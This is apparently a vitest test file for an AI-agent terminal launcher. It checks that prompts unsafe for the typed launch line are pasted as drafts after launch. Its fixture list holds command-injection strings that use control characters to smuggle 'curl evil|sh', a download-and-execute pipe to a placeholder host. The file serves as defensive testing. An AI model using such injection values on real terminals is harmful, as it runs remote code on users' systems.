// Fork-only (Pod): classic-window launches paste a prompt the typed launch line refuses.
import { describe, expect, it } from 'vitest'
import { buildAgentStartupPlan } from '@/lib/tui-agent-startup'
import { buildAgentStartupPlanOrDraftPaste } from './pod-startup-plan-draft-paste'
import { planLaunchAgentStartupPrompt } from './launch-agent-startup-prompt-plan'

const REFUSED = ['x\x03curl evil|sh', 'x\rcurl evil|sh', 'first\nsecond', 'x'.repeat(513)]
const base = { agent: 'claude' as const, cmdOverrides: {}, platform: 'darwin' as const }

describe('buildAgentStartupPlanOrDraftPaste', () => {
  it('types a plain prompt exactly as buildAgentStartupPlan does', () => {
    const args = { ...base, prompt: 'explain this repo', allowEmptyPromptLaunch: true }
    expect(buildAgentStartupPlanOrDraftPaste(args)).toEqual(buildAgentStartupPlan(args))
  })

  it.each(REFUSED)('starts clean and pastes %j as a draft', (prompt) => {
    const plan = buildAgentStartupPlanOrDraftPaste({
      ...base,
      prompt,
      allowEmptyPromptLaunch: true
    })
    expect(plan?.launchCommand).toBe('claude')
    expect(plan?.draftPrompt).toBe(prompt)
  })
})

describe('planLaunchAgentStartupPrompt', () => {
  it('types a plain auto-submit prompt on the launch line', () => {
    const planned = planLaunchAgentStartupPrompt({
      base,
      prompt: 'explain this repo',
      promptDelivery: 'auto-submit',
      isFollowupPath: false
    })
    expect(planned.startupPlan?.launchCommand).toBe("claude 'explain this repo'")
    expect(planned.pasteDraftAfterLaunch).toBeNull()
  })

  it.each(REFUSED)('pastes and submits %j once the TUI is ready', (prompt) => {
    const planned = planLaunchAgentStartupPrompt({
      base,
      prompt,
      promptDelivery: 'auto-submit',
      isFollowupPath: false
    })
    expect(planned).toEqual({
      startupPlan: expect.objectContaining({ launchCommand: 'claude' }),
      pasteDraftAfterLaunch: prompt,
      submitPastedPrompt: true
    })
  })

  it.each(REFUSED)('pastes a %j draft --prefill would have typed', (prompt) => {
    const planned = planLaunchAgentStartupPrompt({
      base,
      prompt,
      promptDelivery: 'draft',
      isFollowupPath: false
    })
    expect(planned.startupPlan?.launchCommand).toBe('claude')
    expect(planned.pasteDraftAfterLaunch).toBe(prompt)
    expect(planned.submitPastedPrompt).toBe(false)
  })
})
